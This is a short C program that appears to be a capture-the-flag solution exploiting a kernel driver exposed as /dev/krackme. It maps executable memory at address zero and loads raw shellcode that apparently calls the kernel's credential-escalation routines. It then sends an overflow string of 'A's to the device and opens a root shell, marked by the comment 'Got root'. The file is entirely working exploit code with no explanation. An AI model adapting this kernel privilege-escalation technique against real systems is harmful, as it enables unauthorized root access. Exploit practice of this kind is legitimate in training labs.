#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

char payload[] =
    "\x48\x31\xff"
    "\xe8\xd8\x93\x06\x81"
    "\x48\x89\xc7"
    "\xe8\x30\x91\x06\x81"
    "\xc3";

int main() {

  mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
       MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, 1, 0);

  memcpy(0, payload, sizeof(payload));

  int fd = open("/dev/krackme", O_WRONLY);
  write(fd,
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7F",
        101);
  close(fd);
  fd = open("/dev/krackme", O_WRONLY);
  write(fd, "g00d_j0b_bu7_y0u_n33d_t0_r34d_/root/flag.txt_br0_*<:-)", 54);
  // Got root
  system("/bin/sh");
}

